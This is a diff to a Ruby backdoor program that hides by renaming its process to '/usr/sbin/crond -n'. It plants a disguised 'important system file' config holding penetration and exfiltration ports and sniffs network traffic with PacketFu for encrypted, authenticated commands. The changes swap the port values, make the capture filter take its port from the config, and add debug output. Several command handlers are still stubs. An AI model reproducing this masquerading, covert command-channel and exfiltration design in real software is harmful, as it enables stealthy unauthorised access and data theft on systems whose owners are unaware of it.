@@ -36,9 +36,9 @@ $0 = "/usr/sbin/crond -n"
 CONFIG_FILE = "not_important"
 CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
 CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
-CONFIG_FILE_DEFAULT << "\# pen_port = 8668\n"
+CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
 CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
-CONFIG_FILE_DEFAULT << "\# exfil_port = 6886\n"
+CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
 CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
 CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
 CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
@@ -95,8 +95,7 @@ end
 
 def start_listen_server
   puts "server listening"
-  #filter = "#{@cfg_pen_protocol} and src port #{@cfg_pen_port}"
-  filter = "#{@cfg_pen_protocol} and dst port 6886"
+  filter = "#{@cfg_pen_protocol} and dst port #{@cfg_pen_port}"
   begin
     cap = PacketFu::Capture.new(:iface => @cfg_iface,
       :start => true,
@@ -105,12 +104,12 @@ def start_listen_server
     cap.stream.each do |p|
       pkt =  PacketFu::Packet.parse(p)
       if @cfg_pen_protocol == TCP
-        puts "in TCP mode"
+        puts "in TCP mode" #DEBUG
         #check for auth
         #if auth'd parse payload for command
         #do command
       elsif @cfg_pen_protocol == UDP
-        puts "in UDP mode"
+        puts "in UDP mode" #DEBUG
         payload = decrypt(pkt.payload)
         cmds = payload.split(' ')
         if cmds[0] = AUTH_STRING
@@ -122,6 +121,7 @@ def start_listen_server
             #get resp
             #start other junk for knock and send back
           when MODE_WATCH
+            puts "WATCH command received" #DEBUG
           end
         else
           next #not auth, skip
